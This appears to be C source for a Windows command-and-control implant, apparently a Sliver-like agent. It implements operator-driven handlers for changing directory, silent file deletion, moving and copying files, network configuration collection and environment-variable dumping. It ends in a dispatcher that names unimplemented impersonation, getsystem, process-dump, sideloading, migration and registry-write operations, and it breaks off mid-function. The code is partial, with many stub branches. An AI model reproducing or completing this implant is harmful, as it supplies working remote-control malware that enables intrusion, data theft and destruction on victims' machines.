#include "pch.h"

PENVELOPE CdHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement pElement = NULL;
	DWORD dwNumberOfBytesRead = 0;
	PBUFFER* pTemp = NULL;
	LPSTR lpRespData = NULL;
	PENVELOPE pRespEnvelope = NULL;
	LPSTR lpErrorDesc = NULL;
	LPSTR lpNewPath = NULL;
	DWORD dwReturnedLength = 0;

	pElement = ALLOC(sizeof(PBElement));
	pElement->Type = Bytes;
	pElement->dwFieldIdx = 1;

	pTemp = UnmarshalStruct(&pElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, &dwNumberOfBytesRead);
	lpNewPath = DuplicateStrA(pTemp[0]->pBuffer, 2);
	if (lpNewPath[lstrlenA(lpNewPath) - 1] != '\\') {
		lstrcatA(lpNewPath, "\\");
	}

	if (!SetCurrentDirectoryA(lpNewPath)) {
		lpErrorDesc = CreateFormattedErr(GetLastError(), "SetCurrentDirectoryA failed at %s.", __FUNCTION__);
		goto CLEANUP;
	}
	
	lpRespData = ALLOC(MAX_PATH);
	dwReturnedLength = GetCurrentDirectoryA(MAX_PATH, lpRespData);
	if (lstrlenA(lpRespData) == 0) {
		lpRespData = REALLOC(lpRespData, dwReturnedLength);
		GetCurrentDirectoryA(dwReturnedLength, lpRespData);
	}

	FreeElement(pElement);
	pElement = CreateBytesElement(lpRespData, lstrlenA(lpRespData), 1);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pElement->cbMarshalledData;
	pElement->pMarshalledData = NULL;
	pElement->cbMarshalledData = 0;
CLEANUP:
	if (lpErrorDesc != NULL) {
		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
		FREE(lpErrorDesc);
	}

	if (pTemp != NULL) {
		FreeBuffer(pTemp[0]);
		FREE(pTemp);
	}

	if (lpNewPath != NULL) {
		FREE(lpNewPath);
	}

	if (lpRespData != NULL) {
		FREE(lpRespData);
	}

	FreeElement(pElement);
	return pRespEnvelope;
}

PENVELOPE RmHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement Element[3];
	PPBElement RespElement;
	PBUFFER* pTemp = NULL;
	LPSTR lpRespData = NULL;
	PENVELOPE pRespEnvelope = NULL;
	DWORD i = 0;
	BOOL Force = FALSE;
	BOOL Recursive = FALSE;
	LPWSTR lpConvertedPath = NULL;
	SHFILEOPSTRUCTW ShFileStruct;
	LPSTR lpErrorDesc = NULL;

	for (i = 0; i < _countof(Element); i++) {
		Element[i] = ALLOC(sizeof(PBElement));
		Element[i]->dwFieldIdx = i + 1;
	}

	Element[0]->Type = Bytes;
	Element[1]->Type = Varint;
	Element[2]->Type = Varint;
	pTemp = UnmarshalStruct(Element, _countof(Element), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	lpConvertedPath = ConvertCharToWchar(pTemp[0]->pBuffer);
	if (pTemp[1] != 0) {
		Recursive = TRUE;
	}

	if (pTemp[2] != 0) {
		Force = TRUE;
	}

	SecureZeroMemory(&ShFileStruct, sizeof(ShFileStruct));
	ShFileStruct.wFunc = FO_DELETE;
	ShFileStruct.pFrom = DuplicateStrW(lpConvertedPath, 2);
	ShFileStruct.fFlags = FOF_NOCONFIRMATION | FOF_NOCONFIRMMKDIR | FOF_NOERRORUI | FOF_NO_UI | FOF_SILENT;
	if (SHFileOperationW(&ShFileStruct)) {
		lpErrorDesc = CreateFormattedErr(GetLastError(), "SHFileOperationW failed at %s.", __FUNCTION__);
		goto CLEANUP;
	}

	lpRespData = DuplicateStrA(pTemp[0]->pBuffer, 0);
	RespElement = CreateBytesElement(lpRespData, lstrlenA(lpRespData), 1);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = RespElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = RespElement->cbMarshalledData;
	RespElement->pMarshalledData = NULL;
	RespElement->cbMarshalledData = 0;
CLEANUP:
	if (lpErrorDesc != NULL) {
		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
		FREE(lpErrorDesc);
	}

	if (ShFileStruct.pFrom != NULL) {
		FREE(ShFileStruct.pFrom);
	}

	if (pTemp != NULL) {
		FreeBuffer(pTemp[0]);
		FREE(pTemp);
	}

	if (lpConvertedPath != NULL) {
		FREE(lpConvertedPath);
	}

	if (lpRespData != NULL) {
		FREE(lpRespData);
	}

	for (i = 0; i < _countof(Element); i++) {
		FreeElement(Element[i]);
	}

	FreeElement(RespElement);
	return pRespEnvelope;
}

PENVELOPE MvHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement Element[2];
	PBUFFER* pTemp = NULL;
	PENVELOPE pRespEnvelope = NULL;
	DWORD i = 0;
	LPWSTR lpSrc = NULL;
	LPWSTR lpDest = NULL;
	SHFILEOPSTRUCTW ShFileStruct;
	LPSTR lpErrorDesc = NULL;

	for (i = 0; i < _countof(Element); i++) {
		Element[i] = ALLOC(sizeof(PBElement));
		Element[i]->dwFieldIdx = i + 1;
	}

	Element[0]->Type = Bytes;
	Element[1]->Type = Bytes;
	pTemp = UnmarshalStruct(Element, _countof(Element), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	lpSrc = ConvertCharToWchar(pTemp[0]->pBuffer);
	lpDest = ConvertCharToWchar(pTemp[1]->pBuffer);

	SecureZeroMemory(&ShFileStruct, sizeof(ShFileStruct));
	ShFileStruct.wFunc = FO_MOVE;
	ShFileStruct.pFrom = DuplicateStrW(lpSrc, 2);
	ShFileStruct.pTo = DuplicateStrW(lpDest, 2);
	ShFileStruct.fFlags = FOF_NOCONFIRMATION | FOF_NOCONFIRMMKDIR | FOF_NOERRORUI | FOF_NO_UI | FOF_SILENT;
	if (SHFileOperationW(&ShFileStruct)) {
		lpErrorDesc = CreateFormattedErr(GetLastError(), "SHFileOperationW failed at %s.", __FUNCTION__);
		goto CLEANUP;
	}

	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
CLEANUP:
	if (lpErrorDesc != NULL) {
		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
		FREE(lpErrorDesc);
	}

	if (ShFileStruct.pFrom != NULL) {
		FREE(ShFileStruct.pFrom);
	}

	if (ShFileStruct.pTo != NULL) {
		FREE(ShFileStruct.pTo);
	}

	if (pTemp != NULL) {
		FreeBuffer(pTemp[0]);
		FreeBuffer(pTemp[1]);
		FREE(pTemp);
	}

	if (lpSrc != NULL) {
		FREE(lpSrc);
	}

	if (lpDest != NULL) {
		FREE(lpDest);
	}

	for (i = 0; i < _countof(Element); i++) {
		FreeElement(Element[i]);
	}

	return pRespEnvelope;
}

PENVELOPE CpHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement Element[2];
	PPBElement RespElementList[3];
	PPBElement RespElement = NULL;
	PBUFFER* pTemp = NULL;
	PENVELOPE pRespEnvelope = NULL;
	DWORD i = 0;
	LPWSTR lpSrc = NULL;
	LPWSTR lpDest = NULL;
	SHFILEOPSTRUCTW ShFileStruct;
	LPSTR lpErrorDesc = NULL;

	for (i = 0; i < _countof(Element); i++) {
		Element[i] = ALLOC(sizeof(PBElement));
		Element[i]->dwFieldIdx = i + 1;
	}

	Element[0]->Type = Bytes;
	Element[1]->Type = Bytes;
	pTemp = UnmarshalStruct(Element, _countof(Element), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	lpSrc = ConvertCharToWchar(pTemp[0]->pBuffer);
	lpDest = ConvertCharToWchar(pTemp[1]->pBuffer);

	SecureZeroMemory(&ShFileStruct, sizeof(ShFileStruct));
	ShFileStruct.wFunc = FO_COPY;
	ShFileStruct.pFrom = DuplicateStrW(lpSrc, 2);
	ShFileStruct.pTo = DuplicateStrW(lpDest, 2);
	ShFileStruct.fFlags = FOF_NOCONFIRMATION | FOF_NOCONFIRMMKDIR | FOF_NOERRORUI | FOF_NO_UI | FOF_SILENT;
	if (SHFileOperationW(&ShFileStruct)) {
		lpErrorDesc = CreateFormattedErr(GetLastError(), "SHFileOperationW failed at %s.", __FUNCTION__);
		goto CLEANUP;
	}

	RespElementList[0] = CreateBytesElement(pTemp[0]->pBuffer, lstrlenA(pTemp[0]->pBuffer), 1);
	RespElementList[1] = CreateBytesElement(pTemp[1]->pBuffer, lstrlenA(pTemp[1]->pBuffer), 2);
	RespElementList[2] = CreateVarIntElement(GetFileSizeByPath(lpSrc), 3);
	RespElement = CreateStructElement(RespElementList, _countof(RespElementList), 0);

	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = RespElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = RespElement->cbMarshalledData;

	RespElement->pMarshalledData = NULL;
	RespElement->cbMarshalledData = 0;
CLEANUP:
	if (lpErrorDesc != NULL) {
		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
		FREE(lpErrorDesc);
	}

	if (ShFileStruct.pFrom != NULL) {
		FREE(ShFileStruct.pFrom);
	}

	if (ShFileStruct.pTo != NULL) {
		FREE(ShFileStruct.pTo);
	}

	if (pTemp != NULL) {
		FreeBuffer(pTemp[0]);
		FreeBuffer(pTemp[1]);
		FREE(pTemp);
	}

	if (lpSrc != NULL) {
		FREE(lpSrc);
	}

	if (lpDest != NULL) {
		FREE(lpDest);
	}

	for (i = 0; i < _countof(Element); i++) {
		FreeElement(Element[i]);
	}

	FreeElement(RespElement);

	return pRespEnvelope;
}

PENVELOPE PwdHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement pElement = NULL;
	LPSTR lpRespData = NULL;
	DWORD dwReturnedLength = 0;
	PENVELOPE pRespEnvelope = NULL;

	lpRespData = ALLOC(MAX_PATH);
	dwReturnedLength = GetCurrentDirectoryA(MAX_PATH, lpRespData);
	if (lstrlenA(lpRespData) == 0) {
		lpRespData = REALLOC(lpRespData, dwReturnedLength);
		GetCurrentDirectoryA(dwReturnedLength, lpRespData);
	}

	pElement = CreateBytesElement(lpRespData, lstrlenA(lpRespData), 1);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pElement->cbMarshalledData;
	pElement->pMarshalledData = NULL;
	pElement->cbMarshalledData = 0;
CLEANUP:
	if (lpRespData != NULL) {
		FREE(lpRespData);
	}

	FreeElement(pElement);

	return pRespEnvelope;
}


LPSTR SocketAddressToStr
(
	_In_ LPSOCKADDR lpSockAddr
)
{
	LPWSTR lpTemp = NULL;
	LPSTR lpResult = NULL;
	DWORD cbTemp = 0x100;
	NTSTATUS Status = STATUS_SUCCESS;

	LPSOCKADDR_IN6 SockIp6 = NULL;
	LPSOCKADDR_IN SockIp = NULL;
	if (lpSockAddr->sa_family == AF_INET) {
		lpTemp = ALLOC(cbTemp * sizeof(WCHAR));
		SockIp = (LPSOCKADDR_IN)(lpSockAddr);
		Status = RtlIpv4AddressToStringExW(&SockIp->sin_addr, 0, lpTemp, &cbTemp);
		if (Status != STATUS_SUCCESS) {
			FREE(lpTemp);
			return NULL;
		}

		lpResult = ConvertWcharToChar(lpTemp);
		FREE(lpTemp);
		return lpResult;
	}
	else if (lpSockAddr->sa_family == AF_INET6) {
		lpTemp = ALLOC(cbTemp * sizeof(WCHAR));
		SockIp6 = (LPSOCKADDR_IN6)(lpSockAddr);
		Status = RtlIpv6AddressToStringExW(&SockIp6->sin6_addr, SockIp6->sin6_scope_id, 0, lpTemp, &cbTemp);
		if (Status != STATUS_SUCCESS) {
			FREE(lpTemp);
			return NULL;
		}

		lpResult = ConvertWcharToChar(lpTemp);
		FREE(lpTemp);
		return lpResult;
	}
	else {
		return NULL;
	}
}

PENVELOPE IfconfigHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PIP_ADAPTER_ADDRESSES pAdapterInfo = NULL;
	PIP_ADAPTER_ADDRESSES pTemp = NULL;
	DWORD cbAdapterInfo = sizeof(IP_ADAPTER_ADDRESSES);
	DWORD dwErrorCode = ERROR_SUCCESS;
	DWORD i = 0;
	CHAR szTempBuffer[0x200];
	LPSTR lpUnicastAddr = NULL;
	LPSTR lpGateWayAddr = NULL;
	LPSTR lpDhcpServer = NULL;
	LPSTR lpDnsServerAddr = NULL;
	PIP_ADAPTER_UNICAST_ADDRESS_LH pAdapterUnicastAddr = NULL;
	PIP_ADAPTER_GATEWAY_ADDRESS_LH pGateWayAddr = NULL;
	PIP_ADAPTER_DNS_SERVER_ADDRESS_XP pDnsServerAddr = NULL;
	ULONG uMask = 0;
	LPSTR lpHostName = NULL;
	LPSTR lpPrimaryDnsSuffix = NULL;
	LPSTR lpErrorDesc = NULL;
	PENVELOPE pRespEnvelope = NULL;
	PFIXED_INFO pFixedInfo = NULL;
	DWORD cbFixedInfo = sizeof(FIXED_INFO);
	DWORD dwLastError = 0;
	LPSTR lpNodeType = NULL;
	LPSTR lpRespData = NULL;
	LPSTR lpTempStr = NULL;

	lpHostName = GetHostName();
	if (lpHostName == NULL) {
		lpErrorDesc = CreateFormattedErr(GetLastError(), "GetHostName() failed at %s.", __FUNCTION__);
		goto CLEANUP;
	}

	lpPrimaryDnsSuffix = GetPrimaryDnsSuffix();
	pFixedInfo = ALLOC(cbFixedInfo);
	while (TRUE) {
		dwLastError = GetNetworkParams(pFixedInfo, &cbFixedInfo);
		if (dwLastError == ERROR_SUCCESS) {
			break;
		}
		else if (dwLastError == ERROR_BUFFER_OVERFLOW) {
			pFixedInfo = REALLOC(pFixedInfo, cbFixedInfo);
		}
		else {
			FREE(pFixedInfo);
			pFixedInfo = NULL;
			break;
		}
	}

	if (pFixedInfo->NodeType == BROADCAST_NODETYPE) {
		lpNodeType = DuplicateStrA("Broadcast", 0);
	}
	else if (pFixedInfo->NodeType == PEER_TO_PEER_NODETYPE) {
		lpNodeType = DuplicateStrA("Peer to peer", 0);
	}
	else if (pFixedInfo->NodeType == MIXED_NODETYPE) {
		lpNodeType = DuplicateStrA("Mixed", 0);
	}
	else if (pFixedInfo->NodeType == HYBRID_NODETYPE) {
		lpNodeType = DuplicateStrA("Hybrid", 0);
	}

	pAdapterInfo = ALLOC(cbAdapterInfo);
	pTemp = pAdapterInfo;
	dwErrorCode = GetAdaptersAddresses(0, GAA_FLAG_INCLUDE_GATEWAYS | GAA_FLAG_INCLUDE_WINS_INFO | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_ANYCAST, NULL, pAdapterInfo, &cbAdapterInfo);
	if (dwErrorCode == ERROR_BUFFER_OVERFLOW) {
		pAdapterInfo = REALLOC(pAdapterInfo, cbAdapterInfo);
		pTemp = pAdapterInfo;
		dwErrorCode = GetAdaptersAddresses(0, GAA_FLAG_INCLUDE_GATEWAYS | GAA_FLAG_INCLUDE_WINS_INFO | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_ANYCAST, NULL, pAdapterInfo, &cbAdapterInfo);
		if (dwErrorCode != ERROR_SUCCESS) {
			lpErrorDesc = CreateFormattedErr(GetLastError(), "GetAdaptersAddresses() failed at %s.", __FUNCTION__);
			goto CLEANUP;
		}
	}

	lpRespData = ALLOC(0x2000);
	lpRespData = StrCatExA(lpRespData, "\nWindows IP Configuration\n\n   Host Name . . . . . . . . . . . . : ");
	lpRespData = StrCatExA(lpRespData, lpHostName);
	lpRespData = StrCatExA(lpRespData, "\n   Primary Dns Suffix  . . . . . . . : ");
	if (lpPrimaryDnsSuffix != NULL) {
		lpRespData = StrCatExA(lpRespData, lpPrimaryDnsSuffix);
	}

	lpRespData = StrCatExA(lpRespData, "\n   Node Type . . . . . . . . . . . . : ");
	if (lpNodeType != NULL) {
		lpRespData = StrCatExA(lpRespData, lpNodeType);
	}

	lpRespData = StrCatExA(lpRespData, "\n   IP Routing Enabled. . . . . . . . : ");
	if (pFixedInfo->EnableRouting) {
		lpRespData = StrCatExA(lpRespData, "yes");
	}
	else {
		lpRespData = StrCatExA(lpRespData, "no");
	}

	lpRespData = StrCatExA(lpRespData, "\n   WINS Proxy Enabled. . . . . . . . : ");
	if (pFixedInfo->EnableProxy) {
		lpRespData = StrCatExA(lpRespData, "yes");
	}
	else {
		lpRespData = StrCatExA(lpRespData, "no");
	}

	while (TRUE) {
		if (pAdapterInfo == NULL) {
			break;
		}

		if (pAdapterInfo->IfType == IF_TYPE_SOFTWARE_LOOPBACK) {
			pAdapterInfo = pAdapterInfo->Next;
			continue;
		}

		lpRespData = StrCatExA(lpRespData, "\n\n");
		lpTempStr = ConvertWcharToChar(pAdapterInfo->FriendlyName);
		lpRespData = StrCatExA(lpRespData, lpTempStr);
		FREE(lpTempStr);
		lpRespData = StrCatExA(lpRespData, ":\n\n   Connection-specific DNS Suffix  . : ");
		if (pAdapterInfo->DnsSuffix != NULL && lstrlenW(pAdapterInfo->DnsSuffix) > 0) {
			lpTempStr = ConvertWcharToChar(pAdapterInfo->DnsSuffix);
			lpRespData = StrCatExA(lpRespData, lpTempStr);
			FREE(lpTempStr);
		}

		lpRespData = StrCatExA(lpRespData, "\n   Description . . . . . . . . . . . : ");
		lpTempStr = ConvertWcharToChar(pAdapterInfo->Description);
		lpRespData = StrCatExA(lpRespData, lpTempStr);
		FREE(lpTempStr);
		lpRespData = StrCatExA(lpRespData, "\n   Physical Address. . . . . . . . . : ");
		SecureZeroMemory(szTempBuffer, sizeof(szTempBuffer));
		for (i = 0; i < pAdapterInfo->PhysicalAddressLength; i++) {
			sprintf_s(&szTempBuffer[i * 3], _countof(szTempBuffer), "%02X-", pAdapterInfo->PhysicalAddress[i]);
		}

		szTempBuffer[lstrlenA(szTempBuffer) - 1] = '\0';
		lpRespData = StrCatExA(lpRespData, szTempBuffer);
		lpRespData = StrCatExA(lpRespData, "\n   DHCP Enabled. . . . . . . . . . . : ");
		if (pAdapterInfo->Flags & IP_ADAPTER_DHCP_ENABLED) {
			lpRespData = StrCatExA(lpRespData, "yes");
		}
		else {
			lpRespData = StrCatExA(lpRespData, "no");
		}

		lpRespData = StrCatExA(lpRespData, "\n   Autoconfiguration Enabled . . . . : yes");
		if (pAdapterInfo->OperStatus == IfOperStatusDown) {
			pAdapterInfo = pAdapterInfo->Next;
			continue;
		}

		lpRespData = StrCatExA(lpRespData, "\n   IP Address. . . . . . . . . . . . : ");
		pAdapterUnicastAddr = pAdapterInfo->FirstUnicastAddress;
		while (TRUE) {
			if (pAdapterUnicastAddr == NULL || pAdapterUnicastAddr->Address.lpSockaddr == NULL) {
				break;
			}

			if (pAdapterUnicastAddr->DadState < NldsDeprecated) {
				pAdapterUnicastAddr = pAdapterUnicastAddr->Next;
				continue;
			}

			if (pAdapterUnicastAddr != pAdapterInfo->FirstUnicastAddress) {
				lpRespData = StrCatExA(lpRespData, "\n                                       ");
			}

			lpUnicastAddr = SocketAddressToStr(pAdapterUnicastAddr->Address.lpSockaddr);
			lpRespData = StrCatExA(lpRespData, lpUnicastAddr);
			FREE(lpUnicastAddr);

			if (pAdapterUnicastAddr->Address.lpSockaddr->sa_family == AF_INET) {
				if (ConvertLengthToIpv4Mask(pAdapterUnicastAddr->OnLinkPrefixLength, &uMask) == STATUS_SUCCESS) {
					SecureZeroMemory(szTempBuffer, sizeof(szTempBuffer));
					sprintf_s(szTempBuffer, _countof(szTempBuffer), "/%d", uMask);
				}
			}

			pAdapterUnicastAddr = pAdapterUnicastAddr->Next;
		}

		lpRespData = StrCatExA(lpRespData, "\n   Default Gateway . . . . . . . . . : ");
		pGateWayAddr = pAdapterInfo->FirstGatewayAddress;
		while (TRUE) {
			if (pGateWayAddr == NULL || pGateWayAddr->Address.lpSockaddr == NULL) {
				break;
			}

			if (pGateWayAddr != pAdapterInfo->FirstGatewayAddress) {
				lpRespData = StrCatExA(lpRespData, "\n                                       ");
			}

			lpGateWayAddr = SocketAddressToStr(pGateWayAddr->Address.lpSockaddr);
			lpRespData = StrCatExA(lpRespData, lpGateWayAddr);
			FREE(lpGateWayAddr);
			pGateWayAddr = pGateWayAddr->Next;
		}

		lpRespData = StrCatExA(lpRespData, "\n   DHCP Server . . . . . . . . . . . : ");
		if (pAdapterInfo->Dhcpv4Server.lpSockaddr != NULL) {
			lpDhcpServer = SocketAddressToStr(pAdapterInfo->Dhcpv4Server.lpSockaddr);
			lpRespData = StrCatExA(lpRespData, lpDhcpServer);
		}
		else if (pAdapterInfo->Dhcpv6Server.lpSockaddr != NULL) {
			lpDhcpServer = SocketAddressToStr(pAdapterInfo->Dhcpv6Server.lpSockaddr);
			lpRespData = StrCatExA(lpRespData, lpDhcpServer);
		}

		lpRespData = StrCatExA(lpRespData, "\n   DNS Servers . . . . . . . . . . . : ");
		pDnsServerAddr = pAdapterInfo->FirstDnsServerAddress;
		while (TRUE) {
			if (pDnsServerAddr == NULL || pDnsServerAddr->Address.lpSockaddr == NULL) {
				break;
			}

			if (pDnsServerAddr != pAdapterInfo->FirstDnsServerAddress) {
				lpRespData = StrCatExA(lpRespData, "\n                                       ");
			}

			lpDnsServerAddr = SocketAddressToStr(pDnsServerAddr->Address.lpSockaddr);
			lpRespData = StrCatExA(lpRespData, lpDnsServerAddr);
			FREE(lpDnsServerAddr);
			pDnsServerAddr = pDnsServerAddr->Next;
		}

		lpRespData = StrCatExA(lpRespData, "\n   NetBIOS over Tcpip. . . . . . . . : ");
		if (pAdapterInfo->Flags & IP_ADAPTER_NETBIOS_OVER_TCPIP_ENABLED) {
			lpRespData = StrCatExA(lpRespData, "yes");
		}
		else {
			lpRespData = StrCatExA(lpRespData, "no");
		}

		pAdapterInfo = pAdapterInfo->Next;
	}

	printf("%s", lpRespData);
CLEANUP:
	if (lpErrorDesc != NULL) {
		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
		FREE(lpErrorDesc);
	}

	if (pTemp != NULL) {
		FREE(pTemp);
	}

	if (lpHostName != NULL) {
		FREE(lpHostName);
	}

	if (lpPrimaryDnsSuffix != NULL) {
		FREE(lpPrimaryDnsSuffix);
	}

	if (pFixedInfo != NULL) {
		FREE(pFixedInfo);
	}

	if (lpNodeType != NULL) {
		FREE(lpNodeType);
	}

	if (lpDhcpServer != NULL) {
		FREE(lpDhcpServer);
	}

	if (lpRespData != NULL) {
		FREE(lpRespData);
	}

	return pRespEnvelope;
}

PENVELOPE GetEnvHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement* pElementList = NULL;
	PPBElement ElementList2[2];
	PPBElement pElement = NULL;
	PPBElement pFinalElement = NULL;
	DWORD cElementList = 0x100;
	PBUFFER* pTemp = NULL;
	PENVELOPE pRespEnvelope = NULL;
	LPWSTR lpEnvList = NULL;
	LPSTR lpKey = NULL;
	LPSTR lpValue = NULL;
	LPWSTR lpTemp = NULL;
	DWORD cEnvList = 0;
	DWORD cbValue = 0;
	DWORD dwNeededSize = 0;

	pElement = ALLOC(sizeof(PBElement));
	pElement->Type = Bytes;
	pElement->dwFieldIdx = 1;
	
	pElementList = ALLOC(cElementList * sizeof(PBElement));
	SecureZeroMemory(ElementList2, sizeof(ElementList2));
	pTemp = UnmarshalStruct(&pElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (pTemp == NULL) {
		lpEnvList = GetEnvironmentStringsW();
		while (TRUE) {
			if (lpEnvList[0] != L'=') {
				break;
			}

			lpEnvList += lstrlenW(lpEnvList);
			lpEnvList++;
		}

		lpTemp = lpEnvList;
		while (TRUE) {
			if (lpTemp[0] == L'\0') {
				break;
			}

			lpKey = ConvertWcharToChar(lpTemp);
			lpTemp += lstrlenW(lpTemp) + 1;
			lpValue = StrChrA(lpKey, '=');
			lpValue[0] = '\0';
			lpValue++;
			if (cEnvList >= cElementList) {
				cElementList = 2 * cEnvList;
				pElementList = REALLOC(pElementList, cElementList * sizeof(PBElement));
			}

			ElementList2[0] = CreateBytesElement(lpKey, lstrlenA(lpKey), 1);
			ElementList2[1] = CreateBytesElement(lpValue, lstrlenA(lpValue), 2);
			FREE(lpKey);
			pElementList[cEnvList++] = CreateStructElement(ElementList2, _countof(ElementList2), 0);
		}

		pFinalElement = CreateRepeatedStructElement(pElementList, cEnvList, 1);
	}
	else {
		lpKey = pTemp[0]->pBuffer;
		cbValue = 0x400;
		lpValue = ALLOC(cbValue);
		dwNeededSize = GetEnvironmentVariableA(lpKey, lpValue, cbValue);
		if (lstrlenA(lpValue) == 0) {
			lpValue = REALLOC(lpValue, dwNeededSize + 1);
			GetEnvironmentVariableA(lpKey, lpValue, dwNeededSize + 1);
		}

		ElementList2[0] = CreateBytesElement(lpKey, lstrlenA(lpKey), 1);
		ElementList2[1] = CreateBytesElement(lpValue, lstrlenA(lpValue), 2);
		pElementList[0] = CreateStructElement(ElementList2, _countof(ElementList2), 0);
		pFinalElement = CreateRepeatedStructElement(pElementList, 1, 1);
		FREE(lpValue);
	}

	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
	pFinalElement->pMarshalledData = NULL;
	pFinalElement->cbMarshalledData = 0;
CLEANUP:
	FreeElement(pFinalElement);
	if (pTemp != NULL) {
		FreeBuffer(pTemp[0]);
		FREE(pTemp);
	}

	if (lpEnvList != NULL) {
		FreeEnvironmentStringsW(lpEnvList);
	}

	FreeElement(pElement);
	return pRespEnvelope;
}

VOID MainHandler
(
	_Inout_ PTP_CALLBACK_INSTANCE Instance,
	_Inout_opt_ PENVELOPE_WRAPPER pWrapper,
	_Inout_ PTP_WORK Work
)
{
	PENVELOPE pResp = NULL;
	PENVELOPE pEnvelope = NULL;

	pEnvelope = pWrapper->pEnvelope;
	if (pEnvelope->uType == MsgTaskReq) {
		
	}
	else if (pEnvelope->uType == MsgProcessDumpReq) {
	
	}
	else if (pEnvelope->uType == MsgImpersonateReq) {
	
	}
	else if (pEnvelope->uType == MsgRevToSelfReq) {
	
	}
	else if (pEnvelope->uType == MsgRunAsReq) {
	
	}
	else if (pEnvelope->uType == MsgInvokeGetSystemReq) {
	
	}
	else if (pEnvelope->uType == MsgInvokeExecuteAssemblyReq) {
	
	}
	else if (pEnvelope->uType == MsgInvokeInProcExecuteAssemblyReq) {
	
	}
	else if (pEnvelope->uType == MsgInvokeMigrateReq) {
	
	}
	else if (pEnvelope->uType == MsgSpawnDllReq) {
	
	}
	else if (pEnvelope->uType == MsgStartServiceReq) {
	
	}
	else if (pEnvelope->uType == MsgStopServiceReq) {
	
	}
	else if (pEnvelope->uType == MsgRemoveServiceReq) {
	
	}
	else if (pEnvelope->uType == MsgEnvReq) {
		pResp = GetEnvHandler(pEnvelope);
	}
	else if (pEnvelope->uType == MsgSetEnvReq) {
	
	}
	else if (pEnvelope->uType == MsgUnsetEnvReq) {
	
	}
	else if (pEnvelope->uType == MsgExecuteWindowsReq) {
	
	}
	else if (pEnvelope->uType == MsgGetPrivsReq) {
	
	}
	else if (pEnvelope->uType == MsgCurrentTokenOwnerReq) {
	
	}
	else if (pEnvelope->uType == MsgRegistryReadHiveReq) {
	
	}
	else if (pEnvelope->uType == MsgIfconfigReq) {
	
	}
	else if (pEnvelope->uType == MsgScreenshotReq) {
	
	}
	else if (pEnvelope->uType == MsgSideloadReq) {
	
	}
	else if (pEnvelope->uType == MsgNetstatReq) {
	
	}
	else if (pEnvelope->uType == MsgMakeTokenReq) {
	
	}
	else if (pEnvelope->uType == MsgPsReq) {
	
	}
	else if (pEnvelope->uType == MsgTerminateReq) {
	
	}
	else if (pEnvelope->uType == MsgRegistryReadReq) {
	
	}
	else if (pEnvelope->uType == MsgRegistryWriteReq) {
	
	}
	else if (pEnvelope->uType == MsgRegistryCreateKeyReq) {
	
	}
	else if (pEnvelope->uType == MsgRegistryDeleteKeyReq) {
	
	}
	else if (pEnvelope->uType == MsgRegistrySubKeysListReq) {
	
	}
	else if (pEnvelope->uType == MsgRegistryListValuesReq) {
	
	}
	else if (pEnvelope->uType == MsgServicesReq) {
	
	}
	else if (pEnvelope->uType == MsgServiceDetailReq) {
	
	}
	else if (pEnvelope->uType == MsgStartServiceByNameReq) {
	
	}
	else if (pEnvelope->uType == MsgMountReq) {
	
	}
	else if (pEnvelope->uType == MsgPing) {
	
	}
	else if (pEnvelope->uType == MsgLsReq) {
	
	}
	else if (pEnvelope->uType == MsgDownloadReq) {
	
	}
	else if (pEnvelope->uType == MsgUploadReq) {
	
	}
	else if (pEnvelope->uType == MsgCdReq) {
		pResp = CdHandler(pEnvelope);
	}
	else if (pEnvelope->uType == MsgPwdReq) {
		pResp = PwdHandler(pEnvelope);
	}
	else if (pEnvelope->uType == MsgRmReq) {
		pResp = RmHandler(pEnvelope);
	}
	else if (pEnvelope->uType == MsgMvReq) {
	
	}
	else if (pEnvelope->uType == MsgCpReq) {
	
	}
	else if (pEnvelope->uType == MsgMkdirReq) {
	
	}
	else if (pEnvelope->uType == MsgExecuteReq) {
	
	}
